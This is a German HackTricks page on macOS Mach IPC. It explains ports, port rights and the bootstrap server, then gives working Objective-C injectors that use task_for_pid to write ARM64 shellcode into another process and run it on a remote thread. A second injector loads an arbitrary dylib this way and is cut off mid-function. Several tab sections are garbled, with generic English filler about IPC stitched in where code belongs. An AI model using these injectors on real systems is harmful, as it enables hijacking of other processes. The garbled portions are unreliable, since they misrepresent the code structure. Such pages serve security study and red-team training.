# macOS IPC - Inter Process Communication

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks in PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

## Mach-Nachrichten über Ports

### Grundlegende Informationen

Mach verwendet **Tasks** als die **kleinste Einheit** zum Teilen von Ressourcen, und jeder Task kann **mehrere Threads** enthalten. Diese **Tasks und Threads sind 1:1 auf POSIX-Prozesse und Threads abgebildet**.

Die Kommunikation zwischen Tasks erfolgt über die Mach Inter-Process Communication (IPC), wobei einseitige Kommunikationskanäle genutzt werden. **Nachrichten werden zwischen Ports übertragen**, die wie **Nachrichtenwarteschlangen** fungieren, die vom Kernel verwaltet werden.

Jeder Prozess verfügt über eine **IPC-Tabelle**, in der die **Mach-Ports des Prozesses** zu finden sind. Der Name eines Mach-Ports ist tatsächlich eine Nummer (ein Zeiger auf das Kernelobjekt).

Ein Prozess kann auch einen Portnamen mit bestimmten Rechten **an einen anderen Task senden**, und der Kernel wird diesen Eintrag in der **IPC-Tabelle des anderen Tasks** erscheinen lassen.

### Portrechte

Portrechte, die definieren, welche Operationen ein Task ausführen kann, sind entscheidend für diese Kommunikation. Die möglichen **Portrechte** sind ([Definitionen von hier](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **Empfangsrecht**, das das Empfangen von an den Port gesendeten Nachrichten ermöglicht. Mach-Ports sind MPSC (multiple-producer, single-consumer) Warteschlangen, was bedeutet, dass es im gesamten System möglicherweise nur **ein Empfangsrecht für jeden Port** gibt (im Gegensatz zu Pipes, bei denen mehrere Prozesse alle Dateideskriptoren zum Lesenende einer Pipe halten können).
* Ein **Task mit dem Empfangsrecht** kann Nachrichten empfangen und **Senderechte erstellen**, die es ihm ermöglichen, Nachrichten zu senden. Ursprünglich hatte nur der **eigene Task das Empfangsrecht über seinen Port**.
* **Senderecht**, das das Senden von Nachrichten an den Port ermöglicht.
* Das Senderecht kann **geklont** werden, sodass ein Task, der ein Senderecht besitzt, das Recht klonen und es einem dritten Task **gewähren kann**.
* **Einmal-Senderecht**, das das Senden einer Nachricht an den Port und dann das Verschwinden ermöglicht.
* **Portset-Recht**, das ein _Portset_ anstelle eines einzelnen Ports kennzeichnet. Das Dequeuing einer Nachricht aus einem Portset entnimmt eine Nachricht aus einem der enthaltenen Ports. Portsets können verwendet werden, um gleichzeitig auf mehreren Ports zu lauschen, ähnlich wie `select`/`poll`/`epoll`/`kqueue` in Unix.
* **Toter Name**, der kein tatsächliches Portrecht ist, sondern nur ein Platzhalter. Wenn ein Port zerstört wird, werden alle bestehenden Portrechte für den Port zu toten Namen.

**Tasks können SEND-Rechte an andere übertragen**, sodass sie Nachrichten zurückschicken können. **SEND-Rechte können auch geklont werden, sodass ein Task das Recht duplizieren und einem dritten Task geben kann**. Dies ermöglicht in Verbindung mit einem Zwischenprozess, der als **Bootstrap-Server** bekannt ist, eine effektive Kommunikation zwischen Tasks.

### Datei-Ports

Datei-Ports ermöglichen es, Dateideskriptoren in Mac-Ports zu kapseln (unter Verwendung von Mach-Portrechten). Es ist möglich, einen `fileport` aus einem gegebenen FD mit `fileport_makeport` zu erstellen und einen FD aus einem `fileport` mit `fileport_makefd` zu erstellen.

### Aufbau einer Kommunikation

#### Schritte:

Wie bereits erwähnt, ist zur Einrichtung des Kommunikationskanals der **Bootstrap-Server** (**launchd** auf dem Mac) beteiligt.

1. Task **A** initiiert einen **neuen Port** und erhält ein **Empfangsrecht** im Prozess.
2. Task **A**, als Inhaber des Empfangsrechts, **erzeugt ein Senderecht für den Port**.
3. Task **A** richtet eine **Verbindung** mit dem **Bootstrap-Server** ein, indem er den **Dienstnamen des Ports** und das **Senderecht** durch ein Verfahren namens Bootstrap-Registrierung bereitstellt.
4. Task **B** interagiert mit dem **Bootstrap-Server**, um eine Bootstrap-**Suche nach dem Dienstnamen** durchzuführen. Wenn erfolgreich, **dupliziert der Server das vom Task A erhaltenen Senderecht** und **überträgt es an Task B**.
5. Nach Erhalt eines Senderechts ist Task **B** in der Lage, eine **Nachricht zu formulieren** und sie **an Task A zu senden**.
6. Für eine bidirektionale Kommunikation erzeugt Task **B** normalerweise einen neuen Port mit einem **Empfangsrecht** und einem **Senderecht** und gibt das **Senderecht an Task A** weiter, damit es Nachrichten an TASK B senden kann (bidirektionale Kommunikation).

Der Bootstrap-Server **kann den** vom Task behaupteten **Dienstnamen nicht authentifizieren**. Dies bedeutet, dass ein **Task potenziell jeden Systemtask impersonieren** könnte, beispielsweise durch **falsche Behauptung eines Autorisierungsdienstnamens** und anschließende Genehmigung jeder Anfrage.

Apple speichert die **Namen der systembereitgestellten Dienste** in sicheren Konfigurationsdateien, die sich in **SIP-geschützten** Verzeichnissen befinden: `/System/Library/LaunchDaemons` und `/System/Library/LaunchAgents`. Neben jedem Dienstnamen wird auch die **zugehörige Binärdatei gespeichert**. Der Bootstrap-Server erstellt und hält ein **Empfangsrecht für jeden dieser Dienstnamen**.

Für diese vordefinierten Dienste unterscheidet sich der **Suchvorgang geringfügig**. Wenn ein Dienstname gesucht wird, startet launchd den Dienst dynamisch. Der neue Ablauf ist wie folgt:

* Task **B** initiiert eine Bootstrap-**Suche** nach einem Dienstnamen.
* **launchd** überprüft, ob der Task läuft, und wenn nicht, **startet** er ihn.
* Task **A** (der Dienst) führt einen **Bootstrap-Check-in** durch. Hier erstellt der **Bootstrap**-Server ein Senderecht, behält es und **überträgt das Empfangsrecht an Task A**.
* launchd dupliziert das **Senderecht und sendet es an Task B**.
* Task **B** erzeugt einen neuen Port mit einem **Empfangsrecht** und einem **Senderecht** und gibt das **Senderecht an Task A** (den Dienst) weiter, damit es Nachrichten an TASK B senden kann (bidirektionale Kommunikation).

Dieser Prozess gilt jedoch nur für vordefinierte Systemaufgaben. Nichtsystemaufgaben funktionieren weiterhin wie ursprünglich beschrieben, was potenziell eine Impersonation ermöglichen könnte.

### Eine Mach-Nachricht

[Weitere Informationen finden Sie hier](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

Die Funktion `mach_msg`, im Wesentlichen ein Systemaufruf, wird zum Senden und Empfangen von Mach-Nachrichten verwendet. Die Funktion erfordert, dass die Nachricht als erstes Argument gesendet wird. Diese Nachricht muss mit einer `mach_msg_header_t`-Struktur beginnen, gefolgt vom eigentlichen Nachrichteninhalt. Die Struktur ist wie folgt definiert:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Prozesse, die ein _**Empfangsrecht**_ besitzen, können Nachrichten über einen Mach-Port empfangen. Umgekehrt erhalten die **Sender** ein _**Senderecht**_ oder ein _**Send-once-Recht**_. Das Send-once-Recht dient ausschließlich zum Senden einer einzelnen Nachricht, nach der es ungültig wird.

Um eine einfache **bidirektionale Kommunikation** zu erreichen, kann ein Prozess in der Mach **Nachrichtenkopf** einen **Mach-Port** als _Antwort-Port_ (**`msgh_local_port`**) angeben, an den der **Empfänger** der Nachricht eine Antwort auf diese Nachricht senden kann. Die Bitflags in **`msgh_bits`** können verwendet werden, um anzuzeigen, dass ein **Send-once-Recht** für diesen Port abgeleitet und übertragen werden soll (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).

{% hint style="success" %}
Beachten Sie, dass diese Art der bidirektionalen Kommunikation bei XPC-Nachrichten verwendet wird, die eine Antwort erwarten (`xpc_connection_send_message_with_reply` und `xpc_connection_send_message_with_reply_sync`). Aber **normalerweise werden verschiedene Ports erstellt**, wie zuvor erklärt, um die bidirektionale Kommunikation herzustellen.
{% endhint %}

Die anderen Felder des Nachrichtenkopfs sind:

- `msgh_size`: die Größe des gesamten Pakets.
- `msgh_remote_port`: der Port, auf dem diese Nachricht gesendet wird.
- `msgh_voucher_port`: [Mach-Gutscheine](https://robert.sesek.com/2023/6/mach\_vouchers.html).
- `msgh_id`: die ID dieser Nachricht, die vom Empfänger interpretiert wird.

{% hint style="danger" %}
Beachten Sie, dass **Mach-Nachrichten über einen \_Mach-Port** gesendet werden, der ein **Kommunikationskanal mit einem einzelnen Empfänger und mehreren Sendern** ist, der in den Mach-Kernel integriert ist. **Mehrere Prozesse** können **Nachrichten an einen Mach-Port senden**, aber zu jedem Zeitpunkt kann nur **ein einziger Prozess daraus lesen**.
{% endhint %}

### Ports auflisten
```bash
lsmp -p <pid>
```
Du kannst dieses Tool in iOS installieren, indem du es von [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) herunterlädst.

### Codebeispiel

Beachte, wie der **Sender** einen Port zuweist, ein **Senderecht** für den Namen `org.darlinghq.example` erstellt und es an den **Bootstrap-Server** sendet, während der Sender nach dem **Senderecht** dieses Namens fragte und es verwendete, um eine **Nachricht zu senden**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %} 

### macOS IPC: Inter-Process Communication

Inter-process communication (IPC) mechanisms are essential for processes to communicate with each other on macOS. There are various IPC mechanisms available on macOS, such as Mach ports, XPC services, and UNIX domain sockets.

#### Mach Ports

Mach ports are a fundamental IPC mechanism in macOS. They allow processes to send messages and data between each other. Mach ports are used by the macOS kernel to manage inter-process communication.

#### XPC Services

XPC services are a high-level IPC mechanism provided by macOS. They allow processes to create and manage lightweight services for inter-process communication. XPC services are commonly used for communication between applications and system services.

#### UNIX Domain Sockets

UNIX domain sockets are another IPC mechanism available on macOS. They allow communication between processes on the same system. UNIX domain sockets use the file system to establish communication channels between processes.

Understanding these IPC mechanisms is crucial for developing secure and efficient macOS applications. By leveraging the appropriate IPC mechanism, developers can ensure that their applications communicate effectively while maintaining system security.

### Privilege Escalation via IPC

Improperly implemented IPC mechanisms can introduce security vulnerabilities that could be exploited for privilege escalation. Developers should carefully design and implement IPC mechanisms to prevent unauthorized access and data leakage.

By understanding how IPC works on macOS and following best practices for IPC implementation, developers can mitigate the risk of privilege escalation vulnerabilities in their applications.

### References

- [Apple Developer Documentation on Inter-Process Communication](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html)

{% endtab %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

### Privilegierte Ports

* **Host-Port**: Wenn ein Prozess das **Senderecht** über diesen Port hat, kann er **Informationen** über das **System** abrufen (z. B. `host_processor_info`).
* **Host-Privat-Port**: Ein Prozess mit dem **Senderecht** über diesen Port kann **privilegierte Aktionen** wie das Laden einer Kernelerweiterung durchführen. Der **Prozess muss root sein**, um diese Berechtigung zu erhalten.
* Darüber hinaus sind für den Aufruf der **`kext_request`**-API weitere Berechtigungen erforderlich, nämlich **`com.apple.private.kext*`**, die nur Apple-Binärdateien erhalten.
* **Task-Name-Port**: Eine nicht privilegierte Version des _Task-Ports_. Es verweist auf den Task, erlaubt jedoch keine Steuerung. Das einzige, was darüber verfügbar zu sein scheint, ist `task_info()`.
* **Task-Port** (auch Kernel-Port)**:** Mit dem Senderecht über diesen Port ist es möglich, den Task zu steuern (Speicher lesen/schreiben, Threads erstellen...).
* Rufen Sie `mach_task_self()` auf, um den Namen für diesen Port für den Aufrufer-Task zu **erhalten**. Dieser Port wird nur beim **`exec()`** vererbt; ein neuer Task, der mit `fork()` erstellt wird, erhält einen neuen Task-Port (als Sonderfall erhält ein Task auch nach `exec()` in einer suid-Binärdatei einen neuen Task-Port). Der einzige Weg, einen Task zu erstellen und seinen Port zu erhalten, besteht darin, den ["Port-Tausch-Tanz"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) während eines `fork()` durchzuführen.
* Dies sind die Einschränkungen für den Zugriff auf den Port (aus `macos_task_policy` aus der Binärdatei `AppleMobileFileIntegrity`):
* Wenn die App die **`com.apple.security.get-task-allow`-Berechtigung** hat, können Prozesse desselben Benutzers auf den Task-Port zugreifen (üblicherweise von Xcode für das Debuggen hinzugefügt). Der **Notarisierungsprozess** erlaubt dies nicht für Produktversionen.
* Apps mit der Berechtigung **`com.apple.system-task-ports`** können den **Task-Port für jeden** Prozess aufrufen, außer den Kernel. In älteren Versionen wurde dies **`task_for_pid-allow`** genannt. Dies wird nur Apple-Anwendungen gewährt.
* **Root kann auf Task-Ports** von Anwendungen zugreifen, die **nicht** mit einer **gehärteten** Laufzeitumgebung kompiliert wurden (und nicht von Apple stammen).

### Shellcode-Injektion in Thread über Task-Port

Sie können ein Shellcode von hier abrufen:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-app-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %} 

### macOS IPC (Inter-Process Communication)

#### macOS IPC Mechanisms

macOS provides several mechanisms for inter-process communication (IPC), including:

1. **Mach Messages**: Low-level messaging system used by the kernel and other system services.
2. **XPC Services**: Lightweight, secure inter-process communication mechanism.
3. **Distributed Objects**: Apple's legacy IPC mechanism, now deprecated in favor of XPC Services.
4. **Unix Domain Sockets**: Inter-process communication between processes on the same system.
5. **Shared Memory**: Allows processes to share memory directly.

#### macOS IPC Security

When designing macOS applications that use IPC, it's important to consider security implications:

1. **Secure Communication**: Use secure communication channels to prevent eavesdropping and tampering.
2. **Input Validation**: Validate input data to prevent injection attacks.
3. **Least Privilege**: Only grant necessary privileges to processes involved in IPC.
4. **Code Signing**: Ensure that only trusted code is involved in IPC to prevent unauthorized access.

By understanding macOS IPC mechanisms and following security best practices, developers can create more secure applications that protect user data and system integrity. 

{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**Kompilieren** Sie das vorherige Programm und fügen Sie die **Berechtigungen** hinzu, um Code mit demselben Benutzer einzuspritzen (ansonsten müssen Sie **sudo** verwenden).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### Dylib-Injektion im Thread über den Task-Port

In macOS können **Threads** über **Mach** oder unter Verwendung der **posix `pthread`-API** manipuliert werden. Der Thread, den wir bei der vorherigen Injektion generiert haben, wurde mit der Mach-API generiert, daher **ist er nicht posix-konform**.

Es war möglich, einen einfachen Shellcode einzuspeisen, um einen Befehl auszuführen, da er **nicht mit posix-konformen APIs arbeiten musste**, sondern nur mit Mach. **Komplexere Injektionen** würden erfordern, dass der **Thread** auch **posix-konform** ist.

Daher sollte zur **Verbesserung des Threads** `pthread_create_from_mach_thread` aufgerufen werden, um einen gültigen pthread zu erstellen. Dann könnte dieser neue pthread `dlopen` aufrufen, um eine dylib aus dem System zu laden. Anstatt neuen Shellcode zu schreiben, um verschiedene Aktionen auszuführen, ist es möglich, benutzerdefinierte Bibliotheken zu laden.

Sie können **Beispiel-Dylibs** finden (zum Beispiel eine, die ein Protokoll generiert, dem Sie dann zuhören können):

{% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

